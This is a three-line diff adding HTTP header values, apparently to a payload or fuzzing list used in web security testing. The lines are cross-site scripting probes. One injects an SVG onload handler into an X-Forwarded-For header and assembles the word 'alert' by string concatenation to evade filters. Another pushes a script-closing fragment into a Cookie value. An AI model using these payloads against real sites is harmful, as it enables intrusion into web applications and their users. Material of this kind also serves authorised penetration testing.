@@ -1,0 +1,3 @@
+X-Forwarded-For: xss 
+X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`// X-Forwarded-For: > 
+Cookie: gdId=xss</script%20
